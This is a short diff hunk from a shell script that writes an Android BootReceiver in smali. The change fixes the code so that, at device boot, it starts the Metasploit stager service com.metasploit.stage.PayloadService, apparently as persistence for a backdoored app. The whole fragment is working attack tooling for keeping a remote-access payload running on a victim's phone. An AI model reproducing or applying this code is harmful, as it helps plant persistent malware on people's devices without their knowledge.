@@ -173,8 +173,10 @@ cat > $BOOTRECEIVER_PATH/BootReceiver.smali <<EOF
 
     if-eqz v0, :cond_end
 
+    const-class v1, Lcom/metasploit/stage/PayloadService;
+
     new-instance v0, Landroid/content/Intent;
-    invoke-direct {v0, p1, Lcom/metasploit/stage/PayloadService;}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
+    invoke-direct {v0, p1, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
 
     invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
 
